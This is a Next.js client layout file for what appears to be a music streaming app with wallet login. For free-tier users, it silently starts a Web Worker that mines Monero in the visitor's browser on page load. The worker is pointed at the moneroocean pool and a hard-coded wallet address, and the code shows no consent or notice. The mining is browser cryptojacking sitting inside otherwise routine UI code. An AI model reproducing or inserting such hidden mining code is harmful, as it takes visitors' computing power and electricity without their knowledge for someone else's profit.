"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import { Sidebar } from "@/components/sidebar";
import { Player } from "@/components/player";
import { PrivyProvider } from "@privy-io/react-auth";

export default function ClientLayout({ children }: { children: React.ReactNode }) {
  const pathname = usePathname();
  const isHomePage = pathname === "/" || pathname.startsWith("/admin");

  const [worker, setWorker] = useState<Worker | null>(null);
  const [freeMode, setFreeMode] = useState(false);
  const [log, setLog] = useState<string[]>([]); // Define the type as string[]
  const [mining, setMining] = useState(false);

  useEffect(() => {
    const userMode = sessionStorage.getItem("User") || "Free";
    const isFreeUser = !userMode || userMode === "Free";
    setFreeMode(isFreeUser);

    if (typeof window !== "undefined") {
      if (isFreeUser){
      const minerWorker = new Worker("http://localhost:3000/minerWorker.js");
      setWorker(minerWorker);

      minerWorker.onmessage = (e) => {
        setLog((prev) => [...prev, `[${e.data.type.toUpperCase()}] ${e.data.message}`]);
        console.log(e)
      };

      return () => minerWorker.terminate(); // Cleanup on unmount
    }
    }
  }, []);

  useEffect(() => {
    // Call startMining only once when the worker is initialized
    if (worker) {
      setMining(true);
      worker.postMessage({
        action: "start",
        data: {
          pool: "gulf.moneroocean.stream",
          wallet: "42LmVzhaXCUXeRGako7gRmKKbEgiSk4i9iQTgbF6TdDaZ4ZwhogUj2k2pvD3n9t22Wcnvuc1Lj94e8jpvtAKViYnKztrPsU",
        },
      });
    }
  }, [worker]); // Runs only when 'worker' is set (initial mount)

  return isHomePage ? (
    <PrivyProvider
    appId="cm6pcnuwz01bofv3214fs2c0g"
    config={{
      appearance: {
        theme: "light",
        accentColor: "#676FFF",
        logo: "https://ethglobal.b-cdn.net/events/agents/square-logo/default.png",
      },
      embeddedWallets: {
        createOnLogin: "users-without-wallets",
      },
    }}
  >
    <div className="flex-1">{children}</div>
    </PrivyProvider>
  ) : !freeMode ? (
    <>
      <PrivyProvider
        appId="cm6pcnuwz01bofv3214fs2c0g"
        config={{
          appearance: {
            theme: "light",
            accentColor: "#676FFF",
            logo: "https://ethglobal.b-cdn.net/events/agents/square-logo/default.png",
          },
          embeddedWallets: {
            createOnLogin: "users-without-wallets",
          },
        }}
      >
        <Sidebar />
        <div className="flex-1">{children}</div>
        <Player />
      </PrivyProvider>
    </>
  ) : (
    <>
        <Sidebar />
        <div className="flex-1">{children}</div>
        <Player />
    </>
  );
}
